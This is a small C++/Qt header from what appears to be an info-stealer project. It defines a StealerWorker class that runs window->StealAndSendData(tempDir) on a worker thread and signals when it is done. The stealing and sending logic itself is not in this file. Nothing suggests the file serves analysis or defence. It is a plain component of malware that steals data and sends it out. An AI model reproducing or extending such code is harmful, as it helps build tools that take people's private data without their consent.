// stealerworker.h
#ifndef STEALERWORKER_H
#define STEALERWORKER_H

#include <QObject>
#include "mainwindow.h"

class StealerWorker : public QObject {
    Q_OBJECT
public:
    StealerWorker(MainWindow* window, const std::string& tempDir)
        : window(window), tempDir(tempDir) {}

public slots:
    void process() {
        window->StealAndSendData(tempDir);
        emit finished();
    }

signals:
    void finished();

private:
    MainWindow* window;
    std::string tempDir;
};

#endif // STEALERWORKER_H